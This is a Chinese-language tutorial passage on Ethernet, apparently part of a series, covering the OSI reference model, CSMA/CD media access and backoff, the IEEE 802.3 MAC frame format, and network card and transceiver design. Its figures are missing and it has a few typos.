从这点来看，也就决定了它在今后建设电信主于网中的地位。另一方面，目
前较为普及的局域网虽然也采用了一些高速网络技术，如FDDI、100Base－T
等，但采用这些技术的网络都有一个共同的特点，即都是基于所谓的媒体共
享。这样，过多的共享必然会降低实际的传输速率，这已成为这类高速网络
的一个症结。解决这个问题的有效方法即是从“共享式”转换为“交换式”，
而ATM这种新型交换技术有其无可替代的优势。现在2Mb/s、34Mb/s、45Mb/s
和155Mb/s的ATM产品已经被人们所接受。在1995年春天，ATM论坛对有关LAN
仿真、新的ATM适配层和低速接入(E1/T1)等方面进行了标准化，这使得相应
的ATM产品的竞争力进一步加强。就ATM的产品生产来看，已有50多家厂商生
产ATM产品，另外尚有100多家厂商在开发有关ATM的交换、集线和路由设备。
从有关ATM的商用化和现场试验来看，目前仅在美国就有十多个ATM现场试验，
其中北卡罗来纳州的信息高速公路网是美国最大的一个ATM网。在加拿大,现
已有七个地方性的ATM投入使用;在欧洲的芬兰、法国和德国等也开通了一些
ATM商用业务；在亚太地区,如日本、朝国、新加坡等国亦有类似的计划。尽
管ATM技术最终的完善和相应市场的成熟还要等至下一世纪，但ATM技术决非
一种仅限于实验室的新技术，目前，它已经开始从实验室走向实用和商业应
用，随着其相关技术的完善和发展，必将会获得广泛的应用。毫无疑问,ATM
与同步光纤网（SONFT）的结合将构成2l世纪通信的主体。
（6）Ethernet网简介
Ethernet网简介Ethernet网简介
在上一期中介绍了LAN的基本组成原理和传输媒体,并从物理网络的角度描述了Ethernet的布线规则和构成网络时的限制。本期将介绍Ethernet的网络体系结构和操作原理，主要介绍内容由以下五部分组成：
一、Ethernet的网络体系结构
1.Ethernet的简史
　　Ethernet是Xerox、Digital Equipment和Intel三家公司开发的局域网组网规范，并于80年代初首次出版，称为DIX1.0。1982年修改后的版本为DIX2.0。 这三家公司将此规范提交给IEEE(电子电气工程师协会)802委员会，经过IEEE成员的修改并通过，变成了IEEE的正式标准，并编号为IEEE802.3。Ethernet和IEEE802.3虽然有很多规定不同，但术语Ethernet通常认为与802.3是兼容的。IEEE将802.3标准提交国际标准化组织(ISO)第一联合技术委员会(JTC1),再次经过修订变成了国际标准ISO8802.3。
2. OSI参考模型
　　IEEE802.3在制定时突出的一个基本思想是将系统进行逻辑划分，并研究如何将连接在一起。我们知道，ISO组织将网络按其功能划分为7个功能层，每层都完成一特定功能。图1所示为OSI参考模型。
　http://download.jjinfo.com/404.htm 　　　　　　　　　
　　　　　　　　　　　 图1
　下面将分别介绍OSI参考模型各层的功能与定义: 
[物理层]
物理层是OSI的第一层，它虽然处于最底层，却是整个开放系统的基础。物理层为设备之间
的数据通信提供传输媒体及互连设备，为数据传输提供可靠的环境。
a.媒体和互连设备
　物理层的媒体包括架空明线、平衡电缆、光纤、无线信道等。通信用的互连设备指DTE和DCE
间的互连设备。DTE既数据终端设备，又称物理设备，如计算机、终端等都包括在内。而DCE则
是数据通信设备或电路连接设备，如调制解调器等。数据传输通常是经过DTE──DCE，再经过
DCE──DTE的路径。互连设备指将DTE、DCE连接起来的装置，如各种插头、插座。
　 LAN中的各种粗、细同轴电缆、T型接、插头，接收器，发送器,中继器等都属物理层的媒体
和连接器。
b.物理层的主要功能
　　⑴为数据端设备提供传送数据的通路,数据通路可以是一个物理媒体,也可以是多个物理媒
体连接而成.一次完整的数据传输,包括激活物理连接,传送数据,终止物理连接.所谓激活,就是
不管有多少物理媒体参与,都要在通信的两个数据终端设备间连接起来,形成一条通路.
　　⑵ 传输数据.物理层要形成适合数据传输需要的实体,为数据传送服务.一是要保证数据能
在其上正确通过，二是要提供足够的带宽(带宽是指每秒钟内能通过的比特(BIT)数),以减少信
道上的拥塞.传输数据的方式能满足点到点,一点到多点,串行或并行,半双工或全双工，同步或
异步传输的需要.
　　⑶ 完成物理层的一些管理工作.
c.物理层的一些重要标准
　　物理层的一些标准和协议早在OSI/TC97/C16 分技术委员会成立之前就已制定并在应用了,
OSI也制定了一些标准并采用了一些已有的成果.下面将一些重要的标准列出,以便读者查阅.
　　ISO2110:称为"数据通信----25芯DTE/DCE接口连接器和插针分配".它与EIA(美国电子工业
　　　　　　协会)的"RS-232-C"基本兼容.
　　ISO2593:称为"数据通信----34芯DTE/DCE----接口连接器和插针分配".
　　ISO4092:称为"数据通信----37芯DTE/DEC----接口连接器和插针分配".与EIARS-449兼容.
　　CCITT V.24:称为"数据终端设备(DTE)和数据电路终接设备之间的接口电路定义表".其功
　　　　　　　 能与EIARS-232-C及RS-449兼容于100序列线上.
[链路层]
数据链路可以粗略地理解为数据通道。物理层要为终端设备间的数据通信提供传输媒体及其
连接.媒体是长期的,连接是有生存期的.在连接生存期内,收发两端可以进行不等的一次或多次数
据通信.每次通信都要经过建立通信联络和拆除通信联络两过程.这种建立起来的数据收发关系就
叫作数据链路.而在物理媒体上传输的数据难免受到各种不可靠因素的影响而产生差错,为了弥补
物理层上的不足,为上层提供无差错的数据传输,就要能对数据进行检错和纠错.数据链路的建立,
拆除,对数据的检错,纠错是数据链路层的基本任务.

　　 ⑴链路层的主要功能
　　 链路层是为网络层提供数据传送服务的,这种服务要依靠本层具备的功能来实现。链路层应
具备如下功能:
　　　 ① 链路连接的建立,拆除,分离.
　　　 ② 帧定界和帧同步.链路层的数据传输单元是帧,协议不同,帧的长短和界面也有差别,但
　　　　　无论如何必须对帧进行定界.
　　　 ③ 顺序控制,指对帧的收发顺序的控制.
　　　 ④ 差错检测和恢复。还有链路标识,流量控制等等.差错检测多用方阵码校验和循环码校
　　　　　验来检测信道上数据的误码,而帧丢失等用序号检测.各种错误的恢复则常靠反馈重发
　　　　　技术来完成.
　　 ⑵数据链路层的主要协议
　　 数据链路层协议是为发对等实体间保持一致而制定的,也为了顺利完成对网络层的服务。主
要协议如下：
　　　 a. ISO1745--1975:"数据通信系统的基本型控制规程".这是一种面向字符的标准,利用10
　　　　　个控制字符完成链路的建立，拆除及数据交换.对帧的收发情况及差错恢复也是靠这些
　　　　　字符来完成.ISO1155, ISO1177, ISO2626, ISO2629等标准的配合使用可形成多种链路
　　　　　控制和数据传输方式.
　　　 b. ISO3309--1984:称为"HDLC 帧结构".ISO4335--1984:称为"HDLC 规程要素 ".
　　　　　ISO7809--1984:称为"HDLC 规程类型汇编".这3个标准都是为面向比特的数据传输控制
　　　　　而制定的.有人习惯上把这3个标准组合称为高级链路控制规程.
　　　 c. ISO7776:称为"DTE数据链路层规程".与CCITT X.25LAB"平衡型链路访问规程"相兼容.
　　 ⑶链路层产品
　　 独立的链路产品中最常见的当属网卡,网桥也是链路产品。MODEM的某些功能有人认为属于链
路层,对些还有争议.

　　数据链路层将本质上不可靠的传输媒体变成可靠的传输通路提供给网络层。在IEEE802.3情况
下，数据链路层分成了两个子层，一个是逻辑链路控制，另一个是媒体访问控制。
　　图2所示为IEEE802.3LAN体系结构。


AUI=连接单元接口　　　　　　 PMA=物理媒体连接
MAU=媒体连接单元　　　　　　 PLS=物理信令
MDI=媒体相关接口
[网络层]
网络层的产生也是网络发展的结果.在联机系统和线路交换的环境中，网络层的功能没有太
大意义.当数据终端增多时.它们之间有中继设备相连.此时会出现一台终端要求不只是与唯一的
一台而是能和多台终端通信的情况,这就是产生了把任意两台数据终端设备的数据链接起来的问
题,也就是路由或者叫寻径.另外,当一条物理信道建立之后,被一对用户使用,往往有许多空闲时
间被浪费掉.人们自然会希望让多对用户共用一条链路，为解决这一问题就出现了逻辑信道技术
和虚拟电路技术.
　　 ⑴网络层主要功能
　　 网络层为建立网络连接和为上层提供服务,应具备以下主要功能.
　　　 ① 路由选择和中继.
　　　 ② 激活,终止网络连接.
　　　 ③ 在一条数据链路上复用多条网络连接,多采取分时复用技术.
　　　 ④ 差错检测与恢复. 
　　　 ⑤ 排序,流量控制.
　　　 ⑥ 服务选择.
　　　 ⑦ 网络管理.
　　 ⑵网络层标准简介
　 　网络层的一些主要标准如下.
　　　ISO.DIS8208:称为"DTE用的X.25分组级协议".
　　　ISO.DIS8348:称为"CO 网络服务定义"(面向连接).
　　　ISO.DIS8349:称为"CL 网络服务定义"(面向无连接).
　　　ISO.DIS8473:称为"CL 网络协议".
　　　ISO.DIS8348:称为"网络层寻址".
　　除上述标准外,还有许多标准。这些标准都只是解决网络层的部分功能,所以往往需要在网络
层中同时使用几个标准才能完成整个网络层的功能.由于面对的网络不同,网络层将会采用不同的
标准组合.
　　在具有开放特性的网络中的数据终端设备,都要配置网络层的功能.现在市场上销售的网络硬
设备主要有网关和路由器.
[传输层]

　 传输层是两台计算机经过网络进行数据通信时,第一个端到端的层次，具有缓冲作用。当网络层服务质量不能满足要求时，它将服务加以提高，以满足高层的要求；当网络层服务质量较好时，它只用很少的工作。传输层还可进行复用，即在一个网络连接上创建多个逻辑连接。
　　传输层也称为运输层.传输层只存在于端开放系统中,是介于低3层通信子网系统和高3层之间的一层,但是很重要的一层.因为它是源端到目的端对数据传送进行控制从低到高的最后一层.
　　有一个既存事实，即世界上各种通信子网在性能上存在着很大差异.例如电话交换网,分组交换网,公用数据交换网，局域网等通信子网都可互连,但它们提供的吞吐量,传输速率,数据延迟通信费用各不相同.对于会话层来说,却要求有一性能恒定的界面.传输层就承担了这一功能.它采用分流/合流，复用/介复用技术来调节上述通信子网的差异,使会话层感受不到.此外传输层还要具备差错恢复，流量控制等功能,以此对会话层屏蔽通信子网在这些方面的细节与差异.传输层面对的数据对象已不是网络地址和主机地址,而是和会话层的界面端口.
　　上述功能的最终目的是为会话提供可靠的,无误的数据传输.传输层的服务一般要经历传输连接建立阶段,数据传送阶段,传输连接释放阶段3个阶段才算完成一个完整的服务过程.而在数据传送阶段又分为一般数据传送和加速数据传送两种。传输层服务分成5种类型.基本可以满足对传送质量,传送速度,传送费用的各种不同需要.
传输层的协议标准有以下几种.　　 ISO8072:称为"面向连接的传输服务定义".　　 ISO8072:称为"面向连接的传输协议规范
[会话层]
会话层提供的服务可使应用建立和维持会话，并能使会话获得同步。会话层使用校验点可使通信会话在通信失效时从校验点继续恢复通信。这种能力对于传送大的文件极为重要。
　　会话层,表示层,应用层构成开放系统的高3层，面对应用进程提供分布处理，对话管理,信息表示,恢复最后的差错等.　会话层同样要担负应用进程服务要求，而运输层不能完成的那部分工作,给运输层功能差距以弥补.主要的功能是对话管理，数据流同步和重新同步。要完成这些功能,需要由大量的服务单元功能组合,已经制定的功能单元已有几十种.现将会话层主要功能介绍如下.
　　 ⑴为会话实体间建立连接
　　 为给两个对等会话服务用户建立一个会话连接,应该做如下几项工作.
　　　　 ① 将会话地址映射为运输地址.
　　　　 ② 选择需要的运输服务质量参数(QOS).
　　　　 ③ 对会话参数进行协商.
　　　　 ④ 识别各个会话连接.
　　　　 ⑤ 传送有限的透明用户数据.
　　 ⑵数据传输阶段
　　 这个阶段是在两个会话用户之间实现有组织的,同步的数据传输.用户数据单元为SSDU,而协议数据单元为SPDU.会话用户之间的数据传送过程是将SSDU转变成SPDU进行的.
　　 ⑶连接释放
　　 连接释放是通过"有序释放","废弃"，"有限量透明用户数据传送"等功能单元来释放会话连接的.
　　会话层标准为了使会话连接建立阶段能进行功能协商，也为了便于其它国际标准参考和引用,定义了12种功能单元.各个系统可根据自身情况和需要，以核心功能服务单元为基础,选配其他功能单元组成合理的会话服务子集.
　　 会话层的主要标准有"DIS8236:会话服务定义"和"DIS8237:会话协议规范".
[表示层]
表示层的作用之一是为异种机通信提供一种公共语言，以便能进行互操作。这种类型的服务之所以需要，是因为不同的计算机体系结构使用的数据表示法不同。例如，IBM主机使用EBCDIC编码，而大部分PC机使用的是ASCII码。在这种情况下，便需要会话层来完成这种转换。
　　通过前面的介绍,我们可以看出,会话层以下5层完成了端到端的数据传送,并且是可靠,无差错的传送.但是数据传送只是手段而不是目的,最终是要实现对数据的使用.由于各种系统对数据的定义并不完全相同,最易明白的例子是键盘,其上的某些键的含义在许多系统中都有差异.这自然给利用其它系统的数据造成了障碍.表示层和应用层就担负了消除这种障碍的任务.
　　对于用户数据来说,可以从两个侧面来分析,一个是数据含义被称为语义,另一个是数据的表示形式,称做语法.像文字,图形,声音,文种,压缩,加密等都属于语法范畴.表示层设计了3类15种功能单位,其中上下文管理功能单位就是沟通用户间的数据编码规则,以便双方有一致的数据形式,能够互相认识.
　　ISO表示层为服务,协议,文本通信符制定了DP8822,DP8823,DIS6937/2等一系列标准.
[应用层] 
应用层向应用程序提供服务，这些服务按其向应用程序提供的特性分成组，并称为服务元素。
有些可为多种应用程序共同使用，有些则为较少的一类应用程序使用。
　　应用层是开放系统的最高层,是直接为应用进程提供服务的。其作用是在实现多个系统应用进
程相互通信的同时,完成一系列业务处理所需的服务.其服务元素分为两类:公共应用服务元素CASE
和特定应用服务元素SASE.
　　CASE提供最基本的服务,它成为应用层中任何用户和任何服务元素的用户，主要为应用进程通
信,分布系统实现提供基本的控制机制.
　　特定服务SASE则要满足一些特定服务,如文卷传送,访问管理,作业传送,银行事务,订单输入等.
这些将涉及到虚拟终端,作业传送与操作,文卷传送及访问管理,远程数据库访问,图形核心系统,开
放系统互连管理等等.
　　应用层的标准有DP8649"公共应用服务元素",DP8650"公共应用服务元素用协议",文件传送,访
问和管理服务及协议.
3.Ethernet的体系结构
　　根据对OSI参考模型的介绍，LAN(包括 Ethernet,令牌环等)已将数据链路层分割为两个子层，
从而使LAN体系结构能适应多种传输媒体，换言之，在 LLC不变的条件下，只需改变MAC(媒体访问
控制)便可适应不同的媒体和访问方法。
　　从上面介绍的OSI参考模型各层功能看，在LAN情况下，由于必须有收发功能,而且还有与传输
媒体相连的问题，所以物理层、数据链路层是必不可少的.但对于第3层(网络层)是否在LAN情况下
也需要，答案有肯定的一方面，也有否定的一方面。从第3层的功能来看，答案是否定的，因为在
LAN情况下不存在路由选择功能，只需在链路层传送到对方即可。网络层的其它功能，如寻址、排
序、流量控制和差错控制均可由数据链路层承担。如果从所连接的设备来看,答案又是肯定的，因
为工作站本身是与媒体直接相连的多个工作站中的一个，这样一种功能刚好是3层的任务。虽然作
为一种计算机网络应能提供第1层到第3层的功能，但LAN的特性却允许在OSI的最低两层实现1-3层
的服务。
　　按照上述分析，LAN的体系结构与OSI参考模型的关系见图2所示。除数据链路层分割为两个子
层外，物理层确定了两个接口：
　　.媒体相关接口(MDI),该接口随媒体而改变，但不影响LLC和MAC的工作。
　　.连接单元接口(AUI)，也就是在粗缆Ethernet情况下的收发器电缆.这种接口在标准中定为选
　　　项，因为在细缆和10Base-T情况下，AUI已不复存在。
二、媒体访问控制(MAC)
三、MAC 帧格式
四、Ethernet网卡的结构及传输原理
五、网卡与传输媒体的连接
六、动态、静态以太网交换技术 
二、媒体访问控制(MAC)
　　IEEE802.3或Ethernet所用的媒体访问法为带有碰撞检测的载波侦听多路访问(CSMA/CD)。按
照这种方法，一个工作站在发送前，首先侦听媒体上是否有活动，即称为“谈前听”协议。所谓
活动是指媒体上有无传输，也就是载波是否存在。如果侦听到有载波存在，工作站便推迟自己的
传输。在侦听的结果为媒体空闲时，则立即开始进行传输。在侦听到媒体忙而等待传输情况下，
当传输中的帧最后一个数据位通过后，应继续等待至少9.6us,以提供适当的帧间间隔，随后便可
进行传输。
　　如果两个工作站同时试图进行传输，将会造成废帧，这种现象称为碰撞，并认为是一种正常
现象，因以媒体上连接的所有工作站的发送都基于媒体上是否有载波，所以称为载波侦听多路访
问(CSMA)。为保证这种操作机制能够运行,还需要具备检测有无碰撞的机制,这便是碰撞检测(CD)。
也就是说，在一个工作站发送过程中仍要不断检测是否出现碰撞。出现碰撞的另一种情况是由下
述原因造成的，即信号在LAN上传播有一定时延，对于粗缆而言,信号在其上的传播速度是光速的
77%。对于细缆,在其上的传播速度为光速的65%。由于这种传播时延，虽然LAN上某一工作站已开
始发送,但由于另外一工作站尚未检测到第一站的传输也启动发送，从而造成碰撞。图3示出了工
作站检测碰撞所需的时间,图中标出的数字1为工作站发送一个帧(传输单位)所需的时间,数字0.5
为工作站A传输到工作站B所需的传播时间。可以看到，工作站A检测到碰撞是从A到B传播时间的2
倍。
　　图3还表明，帧长度要足以在发完之前就能检测到碰撞，否则碰撞检测就失去意义。因此,在
IEEE802.3标准中定义了一个间隙时间,其大小为住返传播时间与为强化碰撞而有意发送的干扰序
列时间之和。这个间隙时间可用来确定最小的MAN帧长。
　　检测到碰撞之后，涉及该次碰撞的站要丢弃各自开始的传输，转而继续发送一种特殊的干扰
信号，使碰撞更加严重以便警告LAN上的所有工作站，碰撞出现了！在此之后,两个碰撞的站都采
退避策略，即都设置一个随机间隔时间，另有当此时间间隔满期后才能启动发送。当然如果这两
个工作站所选的随机间隔时间相同，碰撞将会继续产生。为避免这种情况的出现，退避时间应为
一个服从均匀分布的随机量。同时，由于碰撞产生的重传加大了网络的通信流量，所以当出现多
次碰撞后，它应退避一个较长的时间。

　　截断二进制指数退避(Truncated Binary Exponential Backoff)就是基于这种思想提出的。
其基本算法是：
　　.退避时延是间隔时间的整数倍；
　　.为防止不成功发送无限进行，规定了最大尝试次数n；
　　.碰撞后选择的退避时延为间隔时间的r倍；
　　.r是大于0小于2k范围间的随机整数；K是min(n,10)，即为尝试次数与10中最小的一个。
　　由此可简单写成：
　　　　　　K=Min(尝试次数,10)
　　　　　　r=随机数(0,2 )
　　　　　　退避时延＝r.间隙时间
　　不难看出， 这种算法对无碰撞或碰撞次数较少的工作站而言将获得优先的发送机会。因此，
Etgernet是一种发送机会不能保证的技术，因而不适用于实时应用。尽管有这一潜在的问题，但
现实使用中的Ethernet却很少碰到。
　　CSMA/CD媒体访问方法从上面的描述可归纳为下述4步：
　　第一步：如果媒体信道空闲，则可进行发送。
　　第二步：如果媒体信道有载波(忙)，则继续对信道进行侦听。一旦发现空闲，便立即发送。
　　第三步：如果在发送过程中检测的碰撞，则停止自己的正常发送，转而发送一短暂的干扰信
号，强化碰撞信号，使LAN上所有站都能知道出现了碰撞。
第四步：发送了干扰信号后，退避一随机时间，重新尝试发送。
CSMA/CD如何传输
　　由于CSMA/CD网络使用了公共电缆系统， 则必须使用一些规则来避免工作站同时传输的情况。如果多个工作站同时传输，则必须有一些方法来检测包是否因发生冲突而需重发。(CSMA/CD协议与电话会议非常类似，许多人可以同时在线路上进行对话，但如果每一个人都在同时讲话，则你将听到一片噪声；如果每个人等别人讲完后再讲，则你可以理解各人所说的话。)工作站在CSMA/CD网络上进行传输时，必须按下列五个步骤来进行
1.传输前侦听
各工作站不断地监视电缆段上的载波， 如下图所示。 “载波”是指电缆上的信号，通常由表明电缆正在使用的电压来识别。如果工作站没有侦听到载波，则它假定电缆空闲并开始传输。(按早先提到的电话会议为例子， 这个功能类似于在讲话前听一电话。)如果在工作站传输时电缆忙(载波升起)， 则其包将与已在电缆上的信息发生冲突。
完整的流程图


2.如果电缆忙则等待
为了避免冲突，如果工作站侦听到电缆忙则必须等待， 如下图所示。 正确实现的接口卡如果发现电缆忙将不会有意地传输。(对于电话会议， 如果你听到有人在说话，则你将会一直等到那人讲完才开始讲话。) 延迟时间是工作站试图重传前必须等到线路变成空闲的总时间。 
完整的流程图


3.传输并检测冲突
当介质被清(载波消失)后9.6微秒(us)，工作站可以传输，如下图所示。帧向电缆系统的两个方向传输。 

　如果同一段上的其它工作站同时传输一个包，则数据包在电缆上将产生冲突，如下图所示。 在电缆上发生冲突的数据包现在仅仅是废数据片。(如果你在电话会议中与他人同时讲话，你们俩讲话将冲突，结果产生了噪声信息。)因此， 在传输过程中，工作站应该在电缆段上检测冲突。冲突由电缆上的信息来识别，当电缆上的信号大于或等于由两个或两个以上的收发器同时传输所产生的信号时，则认为冲突产生。 

　如果冲突产生，而其它工作站没有发现冲突信息，则它们可能进行传输。这些工作站将产生另一次的冲突。为了避免这种情况，发生冲突的工作站用传输“干扰”来确保在电缆上的工作站能够感知到冲突， 如下图所示，干扰信息是至少32 位的传输信息，但它不能等于早先所传输报文的CRC值。 产生冲突的工作站的传输计数器加1。
完整的流程图


4.如果冲突发生，重传前等待
如果工作站在冲突后立即重传，则它第二次传输也将产生冲突。因此工作站在重传前必须随机地等待一段时间。　　为了选择何时去进行重传，工作站实现了一个算法，此算法提供了几个使工作站可以进行重传的时间，该算法被称为“退避算法”。工作站随机地选择一个他可以使用的时间，如图所示，这降低了两个或更多个工作站同时重传的机会。(例如：在电话会议中，若两人同时开始讲话，则信息将混乱，两人将停止讲话，然后其中一人再次说话，而一人在听。) 

5.重传或夭折
若工作站是在繁忙的电缆段上，即便其数据包没有在电缆段上与其它产生冲突，也可能不能进行传输。工作站在它必须夭折传输前最多可以有16 次的传输。 NetWareV3.X服务器在MONITOR 实用程序中显示夭折服务器传输的次数， 此值将在LAN驱动程序中的Excess Collisions Count中进行统计。若工作站重传并且没有表明数据包再次产生冲突则认为传输成功。(在电话会议中， 如果你在线路不忙的时候讲话，将可以清楚地听到你的声音。如果你试图讲话，但由于线路不断地忙而不能讲话，则你可以放弃。)
　　工作站传输成功后，可以进行其冲突检测功能的测试，以此来保证正确地工作。这被称为“信息质量错误-SQE”测试。若收发器的SQE功能被设置，则SQE测试将执行。　　注意：所有的中继器将产生禁止SQE，若中继器允许SQE，则冲突将产生并“干扰”网络。
　　若充分理解了工作站是怎样访问介质的，这将有助于确定传输工作站是否在有效地访问介质，并且有助于确定他们是否遵守了CSMA/CD的所有规则。 完整的流程图定义了在CSMA/CD网络上工作站进行传输所必须执行的各个步骤。 如果工作站不按流程图中所描述的步骤执行，这将使电缆段不能使用。
CSMA/CD如何接收
　　我们已弄清了电缆段上传输处理过程。现在让我们来看一下接收端的情况。正如本章早些时候所讨论的那样，工作站传输时它是向电缆系统的两个方向发送的。在电缆段上活动的工作站实现下列四个步骤：
1.浏览收到的数据报并且校验是否成为碎片。
在Ethernet局域网上，电缆段上的所有工作站将浏览中电缆上传输的每一个包，并不考虑其地址是否是本地工作站。(这与电话会议系统类似， 虽然对话不是给你的，但你也能听到。)如下图所示， 接收站检查数据包来保证它有合适的长度，而不是由冲突引起的碎片，包长度最小为64字节。
完整的流程图


2.检验目标地址。
如下图所示，接收站在判明已不是碎片之后，下一步是校验包的目标地址，看它是否要在本地处理。如果包的地址是本地工作站地址，或是“广播地址”，或是被认可的多站地址，工作站将校验包的完整性。

完整的流程图


3.如果目标是本地工作站，则校验数据包的完整性。
在这一步，接收站已知道包不是碎片，并且地址是自身或认可的地址，但并不知道包是否具有正确的格式。在电缆段上畸变了的包，或传输站发出的格式不正确的包仍然可以被接收所接收。为了避免处理畸变了的包，接收站必须校验包的几个特性，如下图所示。
完整的流程图
　　第一个必须校验的特性是长度，如果帧的长度大于1518个字节。则认为此帧为超长帧。超长帧可能是由错误的LAN驱动程序所引起。　　如果包在电缆段上的传播过程中，包的1个或多个位由“1”变成了0”， 或由“0”变成了“1”，则认为此包被畸变。如果包没有超长，接收站将对包进行校验，检查其内容是否与传输时的内容相同，这被称为循环冗余校验(CRC)。 如果包CRC校验出错，接收站则核实帧定界是否正确。
　　错误定界的包不是以8位为边界。所有的包都含有固定的字节的个数， 并且在被定义的字节数后必须结束。没有以字节边界结束的包对准校验将失败。例如：包的长度不能是72个字节加3位，它必须是72个字节或是73个字节。
　　如果帧CRC校验没有通过，但以8位为边界结束(合适的帧定界)，则以为CRC 错误。
　　到目前为止，已经对帧进行了多种校验，看是否包成了碎片，是否包太长，是否包含CRC校验错，是否有合适的帧定位界，如果帧全都成功地通过了这些校验， 则现在将进行最后的长度校验。
　　接收站校验帧是否太短。如果帧长度小于64个字节，并且其格式正确，则认为帧长过小。长度过小的帧可能是由畸变的LAN驱动程序引起的。
　　所有这些校验确保了在接收站开始进行处理前，包的长度及内容都是有效的。如果帧在上述的任何验中出现错误未通过，则接收站将不再将此帧上交到高层协议进行处理。 

4.处理数据包。
如果所已通过了所有的校验，则认为帧是有效的，其格式正确、长度合法。如下图所示。如果工作站仍然有通信问题，则必须进一步通过查看包来寻找问题。
　　 也许是工作站使用了错误的帧类型，或是在IPX/SPX 的报头中存在错误。在CSMA/CD网络上，工作站为了处理一个包，必须完成显示在完整流程图中所定义的所有步骤。


三、MAC帧
1.帧的格式
　　Ethernet上发送的的数据是按一定格式进行的，并将此数据格式称为帧，如图4所示。帧由8
个字段组成，每一字段有一定含义和用途。每个字段长度不等，下面分别加以简述。

　　　　　　　　　　　　　　　　　　处于MAC帧开始处的字段为前导码字段，由7个字节组成。其功能是使接收器建立比特同步。
编码形式为多个“1”或“0”交替构成的二进制序列,最后一比特为“0”。在这种编码形式下，
经过曼彻斯特编码后为一周期性方波。
　　帧首定界符(SFD)是MAN帧的第2个字段,其编码形式为“10101011”序列，长度刚好为一个
字节。该字段的功能是指示一帧的开始。
　　终点地址字段(DA)为第3个字段，长度为6个字节。该字段用来指出帧要发住的工作站。
　　源点地址(SA)处于终点地址字段之后,其长度也为6个字节。该字段功能是指示发送该帧的
工作站地址。
　　长度指示符字段为第5个字段，其长度为2个字节，用来指示紧随其后的逻辑链路控制(LLC)
数据字节的长度，长度单位为字节数。
　　LLC数据字段是帧要载携的用户数据，该数据由LLC子层提供或接收。
　　填充(PAD)字段紧接的LLC之后，用来对LLC数据进行填加，以保证帧有足够长度，适应前面
所述的碰撞检测的需要。
　　帧检验序列(FCS)处于帧的最后，其长度为32比特，用于检验帧在传输过程中有无差错。
　　2.地址字段
　　地址字段包括两部分,处于前面的地址字段为终点地址,处于后面的为源点地址。IEEE802.3
标准规定，源点地址字段中第1比特恒为“0”，这种规定我们从终点地址的规定中便可获悉。
　　终点地址字段有较多的规定，原因是一个帧有可能发给某一工作站，也可能发送给一组工作
站，还有可能发送给所有工作站，我们将后两种情况分别称为组播和广播。\par　　终点地址字
段的格式如图5所示。当该字段第一比特为“0”时，表示帧要发送给某一工作站，即所谓单站地
址。娄该字段第一比特为“1”时，表示帧发送给一组工作站，即所谓组地址。全“1”的组地址
表示广播地址。

　　　　　　　　I/G=0　　单站地址
　　　　　　　　I/G=1　　组地址　
　　　　　　　　U/L=0　　全局地址
　　　　　　　　U/L=1　　局部地址
　　　　　　　　　　　　　　图5
顺便在此指出，帧长除有最小要求外，最长也有限制，这是由于发送站和接收站的缓冲器容
量总有一限度，同时如果一个工作站发送的帧太长，将妨碍其它站对媒体的使用。
四、Ethernet网板的构成
根据对CSMA/CD访问方法的描述,节点网板要执行多种任务， 因此， 每个网板要有自己的控
制器，用以确定何时发送，何时从网络上接受数据，并负责执行802.3所规定的规程， 如构成帧，
计算帧检验序列、执行编码译码转换等。

　　1.LAN管理部分和微处理器
　　网络电路板(也称网板，网卡或网络适配器)由几部分组成，如图6所示。

　　　　　　　　　　　　　　图6　　　　　　　　　
　　LAN的管理部分是网板的核心，负责执行所有规程和数据处理。微处理器部分包括微处理器芯片，RAM芯片和ROM芯片。这一部分在PC机和LAN管理部分间提供链接。当PC机有数据要发送时，便中断微处理器部分，并将数据存储在微处理器部分的RAM芯片中，命令它发送数据。微处理器还将来自PC机的信号转换为LAN管理部分可接受的格式，随后命令LAN管理部分将数据发送到网络上。微处理监视发送过程，经常访问LAN管理部分，以检查发送是否成功。　　一旦PC机准备好从网络上接收帧，它便中断微处理器,并通知它能进行帧的接收。微处理器通过命令LAN管理部分开始接收帧来响应。微处理器对帧的接收过程进行监视。一旦接收的帧由LAN管理部分处理结束，微自理器便中断PC，将接收的数据传给PC机。
　　应该指出，有些网板不含有微处理器部分，在这种情况下，PC机直接控制和监视LAN管理部分的工作。
　　2.曼彻斯特编译码器
　　IEEE802.3或Ethernet规定数据的传输必须用曼彻斯特编码进行。当PC机希望将数据发送到网络上时，总是以并行方式逐字节地传给LAN管理部分，LAN管理部分串行传给“不归零(NRZ)曼彻斯特编码器”， 在这里进行曼彻斯特编码。曼彻斯特的编码过程如图7所示。NRZ曼彻斯特编码器收到NRZ信号后，将其进行编码进而传给发送器发送。当从网络上接收到曼彻斯特编码时，接收器将其传给曼彻斯NRZ特转换器，反转换为NRZ信号这种过程也称为时钟恢复。因此要求很高的精确度。LAN的质量高低就取决于时钟恢复的精确度。

　　　　　　　　　　　　　　　　图7　　　　　　　　　　　 
　　3.发送和发送控制部分
　　发送和接收控制部分负责帧的发送。由图6可以看出，发送部分接受来自“NRZ曼彻斯特转换
器”的曼彻斯特码的数据，并在发送控制部分允许的条件下将数据发送到媒体，发送的数据称为
TxD。
　　发送控制部分判定是否进行发送，这种判定基于LAN基于管理部分和TxD来进行。
　　4.接收和接收控制部分
　　接收和接收控制部分负责帧的接收。这一部分产生网络是否有载波存在的信号，产生的依据
是从RxD中获得。因此，网络上来的信号一方面馈送给接收器，另一方面要馈送给接收控制部分。
接收控制部分根据LAN管理部分和媒体上接收的信号判定是否使接收器工作。
五、网板与媒体的连接
网板与媒体的连接取决于所用的媒体。在媒体为粗缆情况下，通常使用收发器，在标准中称
为MAU，如图2所示。在细缆情况下，使用BNC连接器，没有外加的MAU,
图2 
最右端标有“DTE(所有都不外露)”表示这种情况。在媒体为双绞线的情况下，RJ45使用连接器通过双绞线与Hub相连。与细缆情况相同，MAU的功能已集成到网板上。
　　1.粗缆和细缆下的收发器
　　收发器或MAU的结构如图8所示。来自粗缆的信号馈送给逻辑电路，逻辑电路对此信号进行分
析，并根据分析结果确定开关处于上部还是下部。
　　如果逻辑电路确定网络媒体来的信号是有效的曼彻斯特编码，它便将开关置于上部位置，使
外来信号到达网板。网板检查外来的帧，抽取出终点地址。如果与网板的地址相符，便接受帧的
其余部分。在接收有效信号期间，不允许网板将数据发往收发器。如果有数据要发送，只能推迟
一段时间。 

图8　　　　　
